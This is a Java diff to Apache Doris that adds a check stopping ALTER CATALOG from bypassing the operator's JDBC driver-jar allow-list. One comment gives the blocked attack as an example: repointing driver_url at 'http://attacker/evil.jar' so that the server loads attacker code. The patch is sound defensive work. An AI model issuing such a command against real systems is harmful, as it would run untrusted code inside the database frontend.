@@ -20,6 +20,7 @@ package org.apache.doris.datasource.plugin;
 import org.apache.doris.analysis.ColumnPath;
 import org.apache.doris.catalog.Column;
 import org.apache.doris.catalog.Env;
+import org.apache.doris.catalog.JdbcResource;
 import org.apache.doris.catalog.TableIf;
 import org.apache.doris.catalog.info.ColumnPosition;
 import org.apache.doris.catalog.info.CreateOrReplaceBranchInfo;
@@ -68,6 +69,7 @@ import org.apache.doris.datasource.connector.converter.ConnectorColumnConverter;
 import org.apache.doris.datasource.connector.converter.ConnectorPartitionFieldConverter;
 import org.apache.doris.datasource.log.ExternalObjectLog;
 import org.apache.doris.datasource.log.InitCatalogLog;
+import org.apache.doris.foundation.security.JdbcDriverUrlSecurity;
 import org.apache.doris.nereids.trees.plans.commands.info.AddPartitionFieldOp;
 import org.apache.doris.nereids.trees.plans.commands.info.CreateTableInfo;
 import org.apache.doris.nereids.trees.plans.commands.info.DropPartitionFieldOp;
@@ -85,6 +87,7 @@ import org.apache.logging.log4j.Logger;
 
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
@@ -250,8 +253,106 @@ public class PluginDrivenExternalCatalog extends ExternalCatalog {
         } catch (IllegalArgumentException e) {
             throw new DdlException(e.getMessage(), e);
         }
+        checkDriverUrlsAgainstOperatorGate(candidate, updatedProperties);
         ExternalFunctionRules.check(candidateProperty.getOrDefault("function_rules", null));
         return true;
+    }
+
+    /**
+     * Applies the operator's driver-jar gate ({@code jdbc_driver_secure_path} /
+     * {@code jdbc_driver_url_white_list}) to every driver_url these properties would make the connector
+     * load into the FE JVM.
+     *
+     * <p>On CREATE the same gate is applied inside the connector's {@code preCreateValidation} (through
+     * {@link org.apache.doris.connector.DefaultConnectorValidationContext#validateAndResolveDriverPath}),
+     * which ALTER CATALOG never reaches — it validates through {@code validatePropertiesBeforeUpdate}
+     * alone. Without this call an operator who restricts {@code jdbc_driver_secure_path} would have that
+     * restriction enforced at CREATE and then bypassed by a follow-up
+     * {@code ALTER CATALOG ... SET PROPERTIES("driver_url" = "http://attacker/evil.jar")}, which
+     * {@code resetToUninitialized} makes effective on the next metadata access.
+     *
+     * <p>Deliberately NOT applied on replay: this runs from the {@code !isReplay} ALTER path only, so an
+     * existing catalog whose driver_url predates a since-tightened allow-list keeps loading and FE
+     * startup / follower replay can never be blocked by it.
+     */
+    private void checkDriverUrlsAgainstOperatorGate(Map<String, String> candidate,
+            Map<String, String> updatedProperties) throws DdlException {
+        DriverUrlKeys keys = driverUrlKeysOf(getType());
+        if (keys == null) {
+            return;
+        }
+        // Only an ALTER that touches a driver-url key (or the flavor key that can bring a stored one
+        // to life) can repoint the loaded jar; a stored value was gated at its own CREATE/ALTER time.
+        // Re-resolving an untouched value here would also re-run getFullDriverUrl's file-existence /
+        // cloud-download side effects under CatalogMgr's write lock on every unrelated ALTER, and
+        // would let a since-tightened allow-list fail ALTERs that change nothing about the jar.
+        boolean touched = keys.urlKeys.stream().anyMatch(updatedProperties::containsKey)
+                || (keys.flavorKey != null && updatedProperties.containsKey(keys.flavorKey));
+        if (!touched) {
+            return;
+        }
+        if (keys.flavorKey != null
+                && !"jdbc".equalsIgnoreCase(candidate.getOrDefault(keys.flavorKey, ""))) {
+            // A driver_url on a REST/HMS/filesystem catalog stays the dead config it always was.
+            return;
+        }
+        for (String key : keys.urlKeys) {
+            String driverUrl = candidate.get(key);
+            if (driverUrl == null || driverUrl.trim().isEmpty()) {
+                continue;
+            }
+            try {
+                // The mandatory rule normally runs inside the connector's property holder; repeated
+                // here so a degraded catalog whose plugin is absent (provider validation silently
+                // no-ops) still cannot be repointed at a traversal / non-bare-name jar, and so the
+                // rule holds even under jdbc_driver_secure_path=* (which getFullDriverUrl accepts
+                // wholesale).
+                JdbcDriverUrlSecurity.check(driverUrl);
+                JdbcResource.getFullDriverUrl(driverUrl);
+            } catch (Exception e) {
+                // getFullDriverUrl throws IllegalArgumentException for policy rejections but also bare
+                // RuntimeException for a missing/undownloadable bare-name jar; every failure must become
+                // the DdlException this validation hook promises.
+                throw new DdlException(e.getMessage(), e);
+            }
+        }
+    }
+
+    /** One row of the driver-jar key table: which properties name the jar, live under which flavor key. */
+    private static final class DriverUrlKeys {
+        /** The properties whose value the connector hands to a class loader, documented aliases included. */
+        final List<String> urlKeys;
+        /** The key whose candidate value must be "jdbc" for the urlKeys to be live; null = always live. */
+        final String flavorKey;
+
+        DriverUrlKeys(String flavorKey, String... urlKeys) {
+            this.flavorKey = flavorKey;
+            this.urlKeys = Arrays.asList(urlKeys);
+        }
+    }
+
+    /**
+     * The driver-jar properties of the three jdbc-flavored catalog types, spelled out here because the
+     * fe.conf policy is the engine's to apply while the keys belong to the connectors, and widening the
+     * plugin SPI for three constants is not worth a plugin API major bump. The keys are the user-facing
+     * property names (with their documented aliases), which are wire-stable. This single table drives
+     * BOTH halves of the gate — the trigger set (urlKeys plus flavorKey: the changes that can repoint
+     * the loaded jar) and the values that get checked — so the two can never drift apart. Owners:
+     * JdbcCatalogProperties, IcebergJdbcMetaStoreProperties, PaimonJdbcMetaStoreProperties. A new
+     * consumer of a jdbc-flavored driver_url adds its row here and nowhere else (see the "Remote
+     * Artifacts and Dynamic Code Loading" section of AGENTS.md).
+     */
+    private static DriverUrlKeys driverUrlKeysOf(String catalogType) {
+        if ("jdbc".equalsIgnoreCase(catalogType)) {
+            return new DriverUrlKeys(null, "driver_url", "jdbc.driver_url");
+        }
+        if ("iceberg".equalsIgnoreCase(catalogType)) {
+            return new DriverUrlKeys("iceberg.catalog.type", "iceberg.jdbc.driver_url");
+        }
+        if ("paimon".equalsIgnoreCase(catalogType)) {
+            return new DriverUrlKeys("paimon.catalog.type", "paimon.jdbc.driver_url", "jdbc.driver_url");
+        }
+        return null;
     }
 
     private void checkHiveParquetTimeZone(CatalogProperty property) throws DdlException {
